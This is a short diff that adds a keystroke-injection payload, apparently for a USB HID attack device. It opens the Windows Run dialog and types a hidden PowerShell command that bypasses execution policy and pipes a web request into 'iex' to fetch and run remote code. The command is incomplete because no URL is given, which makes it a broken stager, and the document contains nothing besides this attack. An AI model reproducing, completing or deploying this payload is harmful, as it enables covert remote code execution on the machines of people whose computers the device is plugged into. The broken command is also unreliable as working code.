@@ -1,0 +1,4 @@
+GUI r
+DELAY 100
+STRING powershell -w Hidden -nop -ep Bypass -c iex (iwr -useb)
+ENTER
